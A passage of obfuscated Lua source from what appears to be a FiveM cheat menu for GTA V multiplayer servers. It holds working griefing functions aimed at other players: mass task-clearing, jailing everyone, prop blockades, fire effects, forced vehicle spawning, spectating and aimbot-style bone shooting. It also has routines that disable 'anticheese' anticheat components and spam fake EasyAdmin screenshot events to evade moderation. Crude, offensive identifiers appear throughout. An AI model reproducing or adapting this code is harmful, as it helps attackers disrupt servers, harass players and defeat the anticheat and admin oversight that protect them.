                    SetBlipNameToPlayerName(i6, aW)
                    SetBlipScale(i6, 0.85)
                    if IsPauseMenuActive() then
                        SetBlipAlpha(i6, 255)
                    else
                        x1, y1 =
                            d.Main.GuestTable.GuestUnPack(
                            GetEntityCoords(I.Guestdata.pLocalPlayer.pedId, true)
                        )
                        x2, y2 =
                            d.Main.GuestTable.GuestUnPack(
                            GetEntityCoords(GetPlayerPed(aW), true)
                        )
                        distance =
                            d.Main.GuestMath.GuestFloor(
                            d.Main.GuestMath.GuestAbs(
                                d.Main.GuestMath.GuestSqrt(
                                    (x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2)
                                )
                            ) / -1
                        ) + 900
                        if distance < 0 then
                            distance = 0
                        elseif distance > 255 then
                            distance = 255
                        end
                        SetBlipAlpha(i6, distance)
                    end
                end
            end
        end
    elseif not I.OptionConfig.visb5ea815b0f8440ddaeebad4129bd7222 then
        local h4 = I.natives.GetActivePlayers()
        for b7 = 1, #h4 do
            local aW = h4[b7]
            local K = GetPlayerPed(aW)
            local i6 = GetBlipFromEntity(K)
            if DoesBlipExist(i6) then
                RemoveBlip(i6)
            end
        end
    end
end
I.functions.aPO = {}
I.functions.aPO.dc00b052bd600c772db135459d3ef24 = function()
    for b7 = 0, #I.natives.GetActivePlayers() do
        I.natives.clearPedTasksImmediately(GetPlayerPed(b7))
        ClearPedSecondaryTask(GetPlayerPed(b7))
    end
end
I.functions.aPO.eca565c68b6d24bb61676c7e7452e71 = function()
    local h4 = I.natives.GetActivePlayers()
    for b7 = 0, #h4 do
        if IsPedInAnyVehicle(GetPlayerPed(b7), true) then
            I.natives.clearPedTasksImmediately(GetPlayerPed(b7))
        end
    end
end
I.functions.aPO.dea77e5d7afb36d18381bcb13c16eb7 = function()
    for h in I.NewFunction.sdkfhdshfbdsfhbsaaae() do
        SetVehicleAlarmTimeLeft(h, 60)
    end
end
I.functions.aPO.e77b49bd9684a0376cb2b1cd3f9ae0 = function()
    for X in I.NewFunction.sdkfhdshfbdsfhbsaaae() do
        if X ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) and (not GotTrailer or GotTrailer and X ~= TrailerHandle) then
            I.NewFunction.fhdfsqodjfgsh(X)
            I.natives.d630f96fba91f00943f871c3b2b25(X, true, true, false)
        end
    end
end
I.functions.aPO.b2f3419ef3d8b4fb0b9a501da95 = function()
    for jq in I.NewFunction.sdkfhdshfbdsfhbsaaae() do
        I.functions.sPO.rapeVehicle(jq)
    end
end
I.functions.aPO.b4fea1268aa0100ed5958115edebea = function()
    local h4 = I.natives.GetActivePlayers()
    for b7 = 0, #h4 do
        local jr = GetPlayerPedScriptIndex(GetPlayerPed(b7))
        ClonePed(jr, 1, 1, 1)
    end
end
I.functions.aPO.a82067704cc6922707d00ddbe0451 = function(fM)
    local h4 = I.natives.GetActivePlayers()
    for b7 = 0, #h4 do
        I.functions.sPO.a82067704cc6922707d00ddbe0451(GetPlayerPed(b7), fM)
    end
end
BulletCoords = {}
I.functions.aPO.bbc99a8240bf964dca27f2e8a48f665a = function(js)
    for b7 = 0, #I.natives.GetActivePlayers() do
        I.functions.sPO.bbc99a8240bf964dca27f2e8a48f665a(js, GetPlayerPed(b7))
    end
end
I.functions.aPO.bd9308c903c6d91c8e6d8a61557b6455 = function()
    for p = 0, 50 do
        for b7 in I.NewFunction.dfjofdnsfsdfsdfdsyu() do
            if not IsPedAPlayer(b7) then
                RequestNamedPtfxAsset("core")
                UseParticleFxAssetNextCall("core")
                StartNetworkedParticleFxNonLoopedOnEntity(
                    "ent_sht_flame",
                    b7,
                    0.0,
                    0.0,
                    -0.5,
                    0.0,
                    0.0,
                    0.0,
                    15.0,
                    false,
                    false,
                    false
                )
            end
        end
    end
end
I.functions.aPO.f2ae7507d6c4ad587226368a01bd45d7 = function()
    for h in I.NewFunction.sdkfhdshfbdsfhbsaaae() do
        I.NewFunction.fhdfsqodjfgsh(h)
        ApplyForceToEntity(h, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
    end
end
function RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end
function Oscillate(entity, bR, bS, bT)
    local bU = ggdsngdsfysazeazty(zfqdisfhqisfhzifhze(bR, GetEntityCoords(entity)), bS * bS)
    local bV = AddVectors(ggdsngdsfysazeazty(GetEntityVelocity(entity), 2.0 * bS * bT), vector3(0.0, 0.0, 0.1))
    local bW = zfqdisfhqisfhzifhze(bU, bV)
    ApplyForce(entity, bW)
end
function ggdsngdsfysazeazty(bO, bP)
    return vector3(bO.x * bP, bO.y * bP, bO.z * bP)
end
function f915f8cbe1f0061e1d1bb5e7f0cc8f()
    local fN = GetActivePlayers()
    for b7 = 1, #fN do
        Wait(50)
        local jt = fN[b7]
        if ISMVariables.AllOnlinePlayers.IncludeSelf and fN[b7] ~= PlayerId() then
            ClearPedTasksImmediately(GetPlayerPed(jt))
        elseif not ISMVariables.AllOnlinePlayers.IncludeSelf then
            ClearPedTasksImmediately(GetPlayerPed(jt))
        end
    end
end
function KeyboardEntry(dt, ju)
    result = ""
    if result == "" then
        AddTextEntry("TITLETEXT", dt)
        DisplayOnscreenKeyboard(1, "TITLETEXT", "", "", "", "", "", ju)
    end
    while UpdateOnscreenKeyboard() == 0 do
        DisableAllControlActions(0)
        Wait(250)
    end
    if GetOnscreenKeyboardResult() then
        result = GetOnscreenKeyboardResult()
        CancelOnscreenKeyboard()
    end
    if not HasModelLoaded(GetHashKey(result)) then
        RequestModel(GetHashKey(result))
        Wait(500)
    end
    CancelOnscreenKeyboard()
    return result
end
function AddVectors(bF, bG)
    return vector3(bF.x + bG.x, bF.y + bG.y, bF.z + bG.z)
end
function ApplyForce(entity, bw)
    ApplyForceToEntity(entity, 3, bw, 0, 0, 0, false, false, true, true, false, true)
end
function d32b47862222b5ed81fd0457917(ck)
    if not IsPedDeadOrDying(ck) then
        local hq = GetPedBoneCoords(ck, GetEntityBoneIndexByName(ck, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        local cd, gA =
            d.Main.GuestAimMore.GuestGetCurrentPedWeapon(
            PlayerPedId()
        )
        ShootSingleBulletBetweenCoords(
            AddVectors(hq, vector3(0, 0, 0.1)),
            hq,
            9999,
            true,
            gA,
            PlayerPedId(),
            false,
            false,
            1000.0
        )
        ShootSingleBulletBetweenCoords(
            AddVectors(hq, vector3(0, 0.1, 0)),
            hq,
            9999,
            true,
            gA,
            PlayerPedId(),
            false,
            false,
            1000.0
        )
        ShootSingleBulletBetweenCoords(
            AddVectors(hq, vector3(0.1, 0, 0)),
            hq,
            9999,
            true,
            gA,
            PlayerPedId(),
            false,
            false,
            1000.0
        )
    end
end
function d2dc04d221955ab58005e2babca801e7(aQ)
    if aQ == "Head" then
        return "SKEL_Head"
    elseif aQ == "Chest" then
        return "SKEL_Spine2"
    elseif aQ == "Left Arm" then
        return "SKEL_L_UpperArm"
    elseif aQ == "Right Arm" then
        return "SKEL_R_UpperArm"
    elseif aQ == "Left Leg" then
        return "SKEL_L_Thigh"
    elseif aQ == "Right Leg" then
        return "SKEL_R_Thigh"
    elseif aQ == "Dick" then
        return "SKEL_Pelvis"
    else
        return "SKEL_ROOT"
    end
end
function abbdc88c6080ab513e04d2(bp)
    local bq = GetGameplayCamRot(2)
    local br = GetGameplayCamCoord()
    local bs = 0.0
    local bt = 0.0
    local bu = 0.0
    local bv = 0.0
    local bw = lpdfiodsjqshudvazaerz(bq)
    local bx = vector3(bq.x + 10.0, bq.y + 0.0, bq.z + 0.0)
    local by = vector3(bq.x - 10.0, bq.y + 0.0, bq.z + 0.0)
    local bz = vector3(bq.x, bq.y + 0.0, bq.z + -10.0)
    local bA = lpdfiodsjqshudvazaerz(vector3(bq.x, bq.y + 0.0, bq.z + 10.0)) - lpdfiodsjqshudvazaerz(bz)
    local bB = lpdfiodsjqshudvazaerz(bx) - lpdfiodsjqshudvazaerz(by)
    local bC =
        -d.Main.GuestMath.GuestRad(bq.y)
    vect33 =
        bA *
        d.Main.GuestMath.GuestCos(bC) -
        bB *
            d.Main.GuestMath.GuestSin(
                bC
            )
    vect34 =
        bA *
        d.Main.GuestMath.GuestSin(bC) -
        bB *
            d.Main.GuestMath.GuestCos(
                bC
            )
    local bD, x1, y1 = jdgiohjsiughqfsiguhqdg(br + bw * 10.0 + vect33 + vect34)
    if not bD then
        bs = x1
        bt = y1
        return br + bw * 10.0
    end
    local bE, x2, y2 = jdgiohjsiughqfsiguhqdg(br + bw * 10.0)
    if not bE then
        bv = x2
        bu = y2
        return br + bw * 10.0
    end
    if
        d.Main.GuestMath.GuestAbs(
            bs - bv
        ) < 0.001 or
            d.Main.GuestMath.GuestAbs(
                bt - bu
            ) < 0.001
     then
        return br + bw * 10.0
    end
    local x = (bp.x - bv) / (bs - bv)
    local y = (bp.y - bu) / (bt - bu)
    return br + bw * 10.0 + vect33 * x + vect34 * y
end
function zfqdisfhqisfhzifhze(bF, bG)
    return vector3(bF.x - bG.x, bF.y - bG.y, bF.z - bG.z)
end
function jdgiohjsiughqfsiguhqdg(bK)
    local bL, x, y =
        d.Main.GuestAimMore.GetScreenCoordFromWorldCoord(
        bK.x,
        bK.y,
        bK.z
    )
    if not bL then
        return false
    end
    screenCoordsx = (x - 0.5) * 2.0
    screenCoordsy = (y - 0.5) * 2.0
    return true, screenCoordsx, screenCoordsy
end
function lpdfiodsjqshudvazaerz(bl)
    local bm =
        d.Main.GuestMath.GuestRad(bl.z)
    local bn =
        d.Main.GuestMath.GuestRad(bl.x)
    local bo =
        d.Main.GuestMath.GuestAbs(
        d.Main.GuestMath.GuestCos(bn)
    )
    return vector3(
        -d.Main.GuestMath.GuestSin(bm) *
            bo,
        d.Main.GuestMath.GuestCos(bm) *
            bo,
        d.Main.GuestMath.GuestSin(bn)
    )
end
local function jv()
    local af = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local fY = GetGameplayCamRelativePitch()
    local x =
        -d.Main.GuestMath.GuestSin(
        af * d.Main.GuestMath.GuestPi /
            180.0
    )
    local y =
        d.Main.GuestMath.GuestCos(
        af * d.Main.GuestMath.GuestPi /
            180.0
    )
    local z =
        d.Main.GuestMath.GuestSin(
        fY * d.Main.GuestMath.GuestPi /
            180.0
    )
    local iL =
        d.Main.GuestMath.GuestSqrt(
        x * x + y * y + z * z
    )
    if iL ~= 0 then
        x = x / iL
        y = y / iL
        z = z / iL
    end
    return x, y, z
end
function fjqdisfhqdsiughqdsfg()
    local bH = GetGameplayCamCoord()
    local bI = f22485abbdc88c6080ab513e04d2(0, 0)
    local bJ = zfqdisfhqisfhzifhze(bI, bH)
    return bJ
end
function ae9d2c35d3cc61e47aa6b3d789(x, y, z, af)
    if I.OptionConfig.smoothteleport then
        SwitchOutPlayer(PlayerPedId(), 0, 1)
        Wait(800)
        if IsPedInAnyVehicle(PlayerPedId(), false) then
            c3188c79a068242c231f422e25ebbae(GetPlayersLastVehicle(), x, y, z)
            SetPedIntoVehicle(PlayerPedId(), playersveh, -1)
        else
            c3188c79a068242c231f422e25ebbae(PlayerPedId(), x, y, z)
        end
        SwitchInPlayer(PlayerPedId())
    else
        if IsPedInAnyVehicle(PlayerPedId(), false) then
            c3188c79a068242c231f422e25ebbae(GetPlayersLastVehicle(), x, y, z)
        else
            c3188c79a068242c231f422e25ebbae(PlayerPedId(), x, y, z)
        end
    end
end
function bf17b13c07b03586730bff21ad331ee5(eU)
    local K = GetPlayerPed(eU)
    local coords = GetOffsetFromEntityInWorldCoords(K, 0.0, 8.0, 0.5)
    local x = coords.x
    local y = coords.y
    local z = coords.z
    if not HasModelLoaded(GetHashKey("t20")) then
        RequestModel(GetHashKey("t20"))
        Wait(500)
    end
    local jw = adb831a7fdd83dde087206cc908106f5b9548005fa39fd1e2a309ce7591dff8(GetHashKey("t20"), x, y, z, 0.0, 1, 1)
    Wait(50)
    if DoesEntityExist(jw) then
        local jx = b01828b30c529e6c0abb3a641b2420(GetHashKey("prop_jetski_ramp_01"), x, y, z - 1, 1, 1, 1)
        SetEntityHeading(jw, GetEntityHeading(K))
        SetPedIntoVehicle(K, jw, -1)
        AttachEntityToEntity(jx, jw, 0, 0.0, 3.0, 0.0, 0.0, 0.0, 180.0, false, false, true, false, 0, true)
        SetVehicleCustomPrimaryColour(jw, 0, 0, 0)
        SetVehicleCustomSecondaryColour(jw, 0, 0, 0)
        MaxOut(jw)
    else
        return
    end
end
function c285b6e2e6941c526fa30647675448b4(eU)
    local K = GetPlayerPed(eU)
    local coords = GetOffsetFromEntityInWorldCoords(K, 0.0, 8.0, 0.5)
    local x = coords.x
    local y = coords.y
    local z = coords.z
    if not HasModelLoaded(GetHashKey("t20")) then
        RequestModel(GetHashKey("t20"))
        Wait(500)
    end
    local jw = adb831a7fdd83dde087206cc908106f5b9548005fa39fd1e2a309ce7591dff8(GetHashKey("t20"), x, y, z, 0.0, 1, 1)
    Wait(50)
    if DoesEntityExist(jw) then
        local jx = b01828b30c529e6c0abb3a641b2420(GetHashKey("prop_container_01a"), x, y, z - 1, 1, 1, 1)
        a5a42faa7cf2d2e6ec9530df349f5a7(jw, false)
        SetPedIntoVehicle(K, jw, -1)
        AttachEntityToEntity(jx, jw, 0, 0.0, 3.0, 0.0, 0.0, 0.0, 180.0, false, false, true, false, 0, true)
        MaxOut(jw)
    else
        return
    end
end
function af37cca793e8c4a83df7d7be070a3e99(coords, gA)
    ShootSingleBulletBetweenCoords(
        AddVectors(coords, vector3(0, 0, 0.1)),
        0,
        d.Main.GuestAimMore.GuestGetWeaponDamage(
            gA,
            1
        ),
        true,
        gA,
        PlayerPedId(),
        true,
        true,
        1000.0
    )
end
if IsDisabledControlPressed(0, 19) and IsDisabledControlPressed(0, 73) then
    killmenu = true
end
function DrawRect2(x, y, ct, cu, r, g, b, a)
    local jy, jz = ct / I.ScreenWidth, cu / I.ScreenHeight
    local _x, _y = x / I.ScreenWidth + jy / 2, y / I.ScreenHeight + jz / 2
    d.Main.GuestInv(0x3A618A217E5154F0, _x, _y, jy, jz, r, g, b, a)
end
function c13ddcdb870b0c43e4f32ead248aeea(entity)
    vel = GetEntityVelocity(entity)
    vel = vel[2]
    if vel < 0 then
        vel = vel * -1
    end
    vel = vel / 2
    return vel
end
function DoRapidFireTick()
    DisablePlayerFiring(PlayerPedId(), true)
    if IsDisabledControlPressed(0, 257) and IsPlayerFreeAiming(PlayerId()) then
        local cd, gA =
            d.Main.GuestAimMore.GuestGetCurrentPedWeapon(
            PlayerPedId()
        )
        local gC =
            d.Main.GuestAimMore.GuestGetCurrentPedWeaponEntityIndex(
            PlayerPedId()
        )
        local launchPos = GetEntityCoords(gC)
        local bW = GetGameplayCamCoord() + lpdfiodsjqshudvazaerz(GetGameplayCamRot(2)) * 200.0
        ShootSingleBulletBetweenCoords(launchPos, bW, 5, 1, gA, PlyerPedId(), true, true, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, bW, 5, 1, gA, PlayerPedId(), true, true, 24000.0)
    end
end
function ShootAt(ck, bone)
    local hq = GetPedBoneCoords(ck, GetEntityBoneIndexByName(ck, bone), 0.0, 0.0, 0.0)
    d.Main.GuestAimMore.GuestSetPedShootsAtCoord(
        PlayerPedId(),
        hq,
        true
    )
end
function ShootAt2(ck, bone, al)
    local hq = GetPedBoneCoords(ck, GetEntityBoneIndexByName(ck, bone), 0.0, 0.0, 0.0)
    local cd, gA =
        d.Main.GuestAimMore.GuestGetCurrentPedWeapon(
        PlayerPedId()
    )
    ShootSingleBulletBetweenCoords(
        AddVectors(hq, vector3(0, 0, 0.1)),
        hq,
        al,
        true,
        gA,
        PlayerPedId(),
        true,
        true,
        1000.0
    )
end
function ShootAtBone(ck, bone, al)
    local bone = GetEntityBoneIndexByName(ck, bone)
    local jA = c13ddcdb870b0c43e4f32ead248aeea(ck)
    local hq = GetPedBoneCoords(ck, bone, 0.0, -0.2, 0.0)
    local jB = GetPedBoneCoords(ck, bone, 0.0, 0.2 + jA, 0.0)
    local cd, gA =
        d.Main.GuestAimMore.GuestGetCurrentPedWeapon(
        PlayerPedId()
    )
    ShootSingleBulletBetweenCoords(hq, jB, al, true, gA, PlayerPedId(), true, true, 100.0)
end
function GetEntity(eU)
    local cd, entity =
        d.Main.GuestAimMore.GuestEntityPlayerIsFreeAimingAt(
        eU
    )
    return entity
end
function f2d640737d4432402aea6bcbdc90252(jC)
    ClearFocus()
    local ia = PlayerPedId()
    D = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", GetEntityCoords(ia), 0, 0, 0, jC * 1.0)
    SetCamActive(D, true)
    RenderScriptCams(true, false, 0, true, false)
    SetCamAffectsAiming(D, false)
    if isAttached and DoesEntityExist(entity) then
        offsetCoords = GetOffsetFromEntityGivenWorldCoords(entity, GetCamCoord(D))
        AttachCamToEntity(D, entity, offsetCoords.x, offsetCoords.y, offsetCoords.z, true)
    end
end
function fc858f4ad9b7e9c12fcddc1e6ae220a6()
    ClearFocus()
    RenderScriptCams(false, false, 0, true, false)
    DestroyCam(D, false)
    SetFocusEntity(PlayerPedId())
    offsetRotX = 0.0
    offsetRotY = 0.0
    offsetRotZ = 0.0
    isAttached = false
    speed = 1.0
    precision = 1.0
    currFov = GetGameplayCamFov()
    D = nil
end
disabledControls = {
    30,
    31,
    21,
    36,
    22,
    44,
    38,
    71,
    72,
    59,
    60,
    85,
    86,
    15,
    14,
    37,
    80,
    228,
    229,
    172,
    173,
    37,
    44,
    178,
    244
}
function d5087ddda1a3582a85eca1565579a()
    local ia = PlayerPedId()
    DisableFirstPersonCamThisFrame()
    BlockWeaponWheelThisFrame()
    if not charControl then
        for h, i in pairs(disabledControls) do
            DisableControlAction(0, i, true)
        end
    end
    if IsDisabledControlJustReleased(0, 82) or IsDisabledControlJustReleased(0, 81) then
        if E == "Object Spooner" then
            E = "Vehicle Snatcher"
        elseif E == "Vehicle Snatcher" then
            E = "Object Spooner"
        end
    end
    local hk = GetCamCoord(D)
    local jD = d235cdc1b60b38f7490664fe8e54a020(hk.x, hk.y, hk.z)
    SetFocusArea(jD.x, jD.y, jD.z, 0.0, 0.0, 0.0)
    SetCamCoord(D, jD.x, jD.y, jD.z)
    SetMinimapHideFow(false)
    SetCamRot(D, offsetRotX, offsetRotY, offsetRotZ, 2)
end
function d235cdc1b60b38f7490664fe8e54a020(x, y, z)
    local _x = x
    local _y = y
    local jE = z
    if IsInputDisabled(0) and not charControl then
        if IsDisabledControlPressed(1, 32) then
            local jF = Sin(offsetRotZ)
            local jG = Cos(offsetRotZ)
            local jH = Sin(offsetRotX)
            _x = _x - 0.1 * speed * jF
            _y = _y + 0.1 * speed * jG
            jE = jE + 0.1 * speed * jH
        end
        if IsDisabledControlPressed(1, 33) then
            local jF = Sin(offsetRotZ)
            local jG = Cos(offsetRotZ)
            local jH = Sin(offsetRotX)
            _x = _x + 0.1 * speed * jF
            _y = _y - 0.1 * speed * jG
            jE = jE - 0.1 * speed * jH
        end
        if IsDisabledControlPressed(1, 34) then
            local jF = Sin(offsetRotZ + 90.0)
            local jG = Cos(offsetRotZ + 90.0)
            local jH = Sin(offsetRotY)
            _x = _x - 0.1 * speed * jF
            _y = _y + 0.1 * speed * jG
            jE = jE + 0.1 * speed * jH
        end
        if IsDisabledControlPressed(1, 35) then
            local jF = Sin(offsetRotZ + 90.0)
            local jG = Cos(offsetRotZ + 90.0)
            local jH = Sin(offsetRotY)
            _x = _x + 0.1 * speed * jF
            _y = _y - 0.1 * speed * jG
            jE = jE - 0.1 * speed * jH
        end
        if IsDisabledControlPressed(0, 21) then
            speed = 15.0
        else
            speed = 2.0
        end
        offsetRotX = offsetRotX - GetDisabledControlNormal(1, 2) * precision * 8.0
        offsetRotZ = offsetRotZ - GetDisabledControlNormal(1, 1) * precision * 8.0
    end
    if offsetRotX > 90.0 then
        offsetRotX = 90.0
    elseif offsetRotX < -90.0 then
        offsetRotX = -90.0
    end
    if offsetRotY > 90.0 then
        offsetRotY = 90.0
    elseif offsetRotY < -90.0 then
        offsetRotY = -90.0
    end
    if offsetRotZ > 360.0 then
        offsetRotZ = offsetRotZ - 360.0
    elseif offsetRotZ < -360.0 then
        offsetRotZ = offsetRotZ + 360.0
    end
    return {x = _x, y = _y, z = jE}
end
function b20af3603344e312ec1a6e84bfbefce2(jI, jC)
    if jI then
        f2d640737d4432402aea6bcbdc90252(jC)
        _menuPool:RefreshIndex()
    else
        fc858f4ad9b7e9c12fcddc1e6ae220a6()
        _menuPool:RefreshIndex()
    end
end
function GetEntityInFrontOfCam()
    local hk = GetCamCoord(D)
    local fW = GetCamCoord(D) + lpdfiodsjqshudvazaerz(GetCamRot(D, 2)) * 40
    local jJ = StartShapeTestRay(hk.x, hk.y, hk.z, fW.x, fW.y, fW.z, -1)
    local a, b, eW, eX, entity = GetShapeTestResult(jJ)
    return entity
end
function e335f862fae39c92ad7621009ed2d09a()
    d.Main.GuestThread(
        function()
            while I.OptionConfig.vault_doors do
                local K = PlayerPedId()
                local coords = GetEntityCoords(K)
                local door =
                    GetClosestObjectOfType(coords.x, coords.y, coords.z, 1.0, "v_ilev_gb_vauldr", false, false, false)
                local jK =
                    GetClosestObjectOfType(
                    coords.x,
                    coords.y,
                    coords.z,
                    1.0,
                    "v_ilev_bk_vaultdoor",
                    false,
                    false,
                    false
                )
                c3188c79a068242c231f422e25ebbae(door, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false)
                c3188c79a068242c231f422e25ebbae(jK, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false)
                DeleteEntity(door)
                DeleteEntity(jK)
                Wait(5000)
            end
        end
    )
end
function a0c2d90a367dfc455036ffebf7ef4cf0()
    d.Main.GuestThread(
        function()
            while I.OptionConfig.a0c2d90a367dfc455036ffebf7ef4cf0 do
                d.Main.GuestEvent("gameCheck")
                Wait(5000)
            end
        end
    )
end
function fb5f8dc1fbf108c3e748b0759998a49a()
    d.Main.GuestThread(
        function()
            while I.OptionConfig.SSBBypass and not killmenu do
                for b7 = 1, 20 do
                    d.Main.GuestEvent(
                        "EasyAdmin:CaptureScreenshot"
                    )
                    d.Main.GuestEvent("EasyAdmin:TookScreenshot")
                end
                Wait(20000)
            end
        end
    )
end
function d1179e95692305fbf09b7ca874()
    local hk = GetCamCoord(D)
    local fW = GetCamCoord(D) + lpdfiodsjqshudvazaerz(GetCamRot(D, 2)) * 40
    local jJ = StartShapeTestRay(hk.x, hk.y, hk.z, fW.x, fW.y, fW.z, -1)
    local a, b, eW, eX, entity = GetShapeTestResult(jJ)
    return entity
end
function fa273d3dbc025e4f6212452d7ce66898()
    Markerloc = GetCamCoord(D) + lpdfiodsjqshudvazaerz(GetCamRot(D, 2)) * 20
    return Markerloc
end
function e98f2ffae8b8c3a295f4bc4()
    if not isAttached then
        entity = GetEntityInFrontOfCam()
        if DoesEntityExist(entity) then
            offsetCoords = GetOffsetFromEntityGivenWorldCoords(entity, GetCamCoord(D))
            d.Main.GuestWait(1)
            local hk = GetCamCoord(D)
            AttachCamToEntity(D, entity, GetOffsetFromEntityInWorldCoords(entity, hk.x, hk.y, hk.z), true)
            isAttached = true
        end
    else
        ClearFocus()
        DetachCam(D)
        isAttached = false
    end
end
function f9f10ee563488a8a39f537f6387e4d72(jI)
    if jI and isAttached then
        pointEntity = true
        PointCamAtEntity(D, entity, 0.0, 0.0, 0.0, 1)
    else
        pointEntity = false
        StopCamPointing(D)
    end
end
function af75be6762ce43cd7ad9cad6c703f8e5(eU)
    if onAim == "true" then
        return true
    else
        return IsPedShooting(eU)
    end
end
local function jL(bg, bh, bi)
    return d.Main.GuestCoroutine.GustWrap(
        function()
            local bj, aW = bg()
            if not aW or aW == 0 then
                bi(bj)
                return
            end
            local bf = {handle = bj, destructor = bi}
            d.Main.GuestCoroutine.GuestMetatable(
                bf,
                be
            )
            local bk = true
            repeat
                d.Main.GuestCoroutine.GuestYield(
                    aW
                )
                bk, aW = bh(bj)
            until not bk
            bf.destructor, bf.handle = nil, nil
            bi(bj)
        end
    )
end
function f79156a3ecec7e2fae4e99ae06a241f()
    return jL(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end
function d22eb5d3d78dc75e96647692c5()
    return jL(FindFirstObject, FindNextObject, EndFindObject)
end
function EnumeratePeds()
    return jL(FindFirstPed, FindNextPed, EndFindPed)
end
function c3b2766b95403368b158933998f33080(jM)
    if
        d.Main.GuestString.GuestFind(
            jM,
            "anticheese"
        )
     then
        d.Main.GuestEvent(
            "anticheese:SetComponentStatus",
            "Teleport",
            false
        )
        d.Main.GuestEvent(
            "anticheese:SetComponentStatus",
            "GodMode",
            false
        )
        d.Main.GuestEvent(
            "anticheese:SetComponentStatus",
            "Speedhack",
            false
        )
        d.Main.GuestEvent(
            "anticheese:SetComponentStatus",
            "WeaponBlacklist",
            false
        )
        d.Main.GuestEvent(
            "anticheese:SetComponentStatus",
            "CustomFlag",
            false
        )
        d.Main.GuestEvent(
            "anticheese:SetComponentStatus",
            "Explosions",
            false
        )
        d.Main.GuestEvent(
            "anticheese:SetComponentStatus",
            "CarBlacklist",
            false
        )
    end
end
I.functions.aPO.jail = function()
    for b7 = 0, #I.natives.GetActivePlayers() do
        I.functions.sPO.jailTheFucker(GetPlayerServerId(b7), 5391)
    end
end
I.functions.aPO.unJail = function()
    for b7 = 0, #I.natives.GetActivePlayers() do
        I.functions.sPO.unJailTheFucker(GetPlayerServerId(b7), 5391)
    end
end
I.functions.aPO.a0c3c7c65448d332b391432b870632 = function()
    for b7 = 0, #I.natives.GetActivePlayers() do
        I.functions.sPO.a0c3c7c65448d332b391432b870632(GetPlayerServerId(b7))
    end
end
I.functions.aPO.propBlock = function(dD)
    d.Main.GuestThread(
        function()
            local jN = -145066854
            RequestModel(jN)
            while not HasModelLoaded(jN) do
                d.Main.GuestWait(0)
            end
            if I.menuTables.trollsPropBlock.selected == 1 then
                local jO = I.natives.createObject(jN, 97.8, -993.22, 28.41, true, true, false)
                local jP = I.natives.createObject(jN, 247.08, -1027.62, 28.26, true, true, false)
                local jQ = I.natives.createObject(jN, 274.51, -833.73, 28.25, true, true, false)
                local jR = I.natives.createObject(jN, 291.54, -939.83, 27.41, true, true, false)
                local jS = I.natives.createObject(jN, 143.88, -830.49, 30.17, true, true, false)
                local jT = I.natives.createObject(jN, 161.97, -768.79, 29.08, true, true, false)
                local jU = I.natives.createObject(jN, 151.56, -1061.72, 28.21, true, true, false)
                SetEntityHeading(jO, 39.79)
                SetEntityHeading(jP, 128.62)
                SetEntityHeading(jQ, 212.1)
                SetEntityHeading(jR, 179.22)
                SetEntityHeading(jS, 292.37)
                SetEntityHeading(jT, 238.46)
                SetEntityHeading(jU, 61.43)
                FreezeEntityPosition(jO, true)
                FreezeEntityPosition(jP, true)
                FreezeEntityPosition(jQ, true)
                FreezeEntityPosition(jR, true)
                FreezeEntityPosition(jS, true)
                FreezeEntityPosition(jT, true)
                FreezeEntityPosition(jU, true)
            elseif I.menuTables.trollsPropBlock.selected == 2 then
                local jV = I.natives.createObject(jN, 439.43, -965.49, 27.05, true, true, false)
                local jW = I.natives.createObject(jN, 401.04, -1015.15, 27.42, true, true, false)
                local jX = I.natives.createObject(jN, 490.22, -1027.29, 26.18, true, true, false)
                local jY = I.natives.createObject(jN, 491.36, -925.55, 24.48, true, true, false)
                SetEntityHeading(jV, 130.75)
                SetEntityHeading(jW, 212.63)
                SetEntityHeading(jX, 340.06)
                SetEntityHeading(jY, 209.57)
                FreezeEntityPosition(jV, true)
                FreezeEntityPosition(jW, true)
                FreezeEntityPosition(jX, true)
                FreezeEntityPosition(jY, true)
            elseif I.menuTables.trollsPropBlock.selected == 3 then
                local jZ = I.natives.createObject(jN, -50.97, -1066.92, 26.52, true, true, false)
                local j_ = I.natives.createObject(jN, -63.86, -1099.05, 25.26, true, true, false)
                local k0 = I.natives.createObject(jN, -44.13, -1129.49, 25.07, true, true, false)
                SetEntityHeading(jZ, 160.59)
                SetEntityHeading(j_, 216.98)
                SetEntityHeading(k0, 291.74)
                FreezeEntityPosition(jZ, true)
                FreezeEntityPosition(j_, true)
                FreezeEntityPosition(k0, true)
            end
        end
    )
end
I.functions.sPO = {}
I.functions.sPO.ed1ac970599f35651bc8d0f9c493becd = function(ck)
    I.OptionConfig.sPOIsSpectating = not I.OptionConfig.sPOIsSpectating
    local k1 = GetPlayerPed(ck)
    if I.OptionConfig.sPOIsSpectating then
        local id, ie, ig =
            d.Main.GuestTable.GuestUnPack(
            GetEntityCoords(k1, false)
        )
        RequestCollisionAtCoord(id, ie, ig)
        NetworkSetInSpectatorMode(true, k1)
        RequestCollisionAtCoord(GetEntityCoords(k1))
        NetworkSetInSpectatorMode(true, k1)
        I.functions.game.subtitle("Started spectating ~b~" .. GetPlayerName(ck))
    else
        local id, ie, ig =
            d.Main.GuestTable.GuestUnPack(
            GetEntityCoords(k1, false)
        )
        RequestCollisionAtCoord(id, ie, ig)
        NetworkSetInSpectatorMode(false, k1)
        I.functions.game.subtitle("Stopped spectating ~b~" .. GetPlayerName(ck))
    end
end
I.functions.sPO.teleportToPlayer = function(ck)
    local x, y, z =
        d.Main.GuestTable.GuestUnPack(
        GetEntityCoords(GetPlayerPed(ck))
    )
    I.functions.bd249ffd8df1cc2f86757331(x, y, z)
end
I.functions.sPO.teleportIntoVehicle = function(ck)
    if not IsPedInAnyVehicle(ck) then
        return Guestcustomnotif("~p~Guest Menu : ~s~Player must be sitting in a vehicle!", 0)
    end
    local X = GetVehiclePedIsUsing(ck)
    local k2 = GetVehicleMaxNumberOfPassengers(X)
